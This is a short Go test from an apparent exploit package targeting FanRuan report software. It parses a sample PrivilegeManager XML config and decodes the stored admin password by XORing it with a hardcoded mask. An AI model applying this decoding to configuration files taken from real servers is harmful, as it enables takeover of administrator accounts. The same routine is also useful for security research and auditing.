package exp_fanruan

import (
	"encoding/xml"
	"strconv"
	"strings"
	"testing"
)

func TestUpload1(t *testing.T) {
	msg := `
<?xml version="1.0" encoding="UTF-8"?>
<PrivilegeManager>
<rootManagerName>
<![CDATA[admin]]></rootManagerName>
<rootManagerPassword>
<![CDATA[___0072002a00670066000a]]></rootManagerPassword>
<AP class="com.fr.privilege.providers.NoAuthenticationProvider"/>
<ForwardUrl>
<![CDATA[${servletURL}?op=fr_platform]]></ForwardUrl>
</PrivilegeManager>
`
	pm := new(PrivilegeManager)
	err := xml.Unmarshal([]byte(msg), pm)
	cipher := strings.TrimSpace(pm.RootManagerPassword.Text)
	// 解密
	PASSWORD_MASK_ARRAY := []byte{19, 78, 10, 15, 100, 213, 43, 23}
	pwd := ""
	cipher = cipher[3:]
	for i := 0; i < int(len(cipher)/4); i++ {
		c1, err := strconv.ParseUint(cipher[i*4:(i+1)*4], 16, 32)
		if err != nil {
			t.Log(err)
			return
		}
		c2 := byte(c1) ^ PASSWORD_MASK_ARRAY[i%8]
		pwd += string(c2)
	}
	t.Log(err)
}
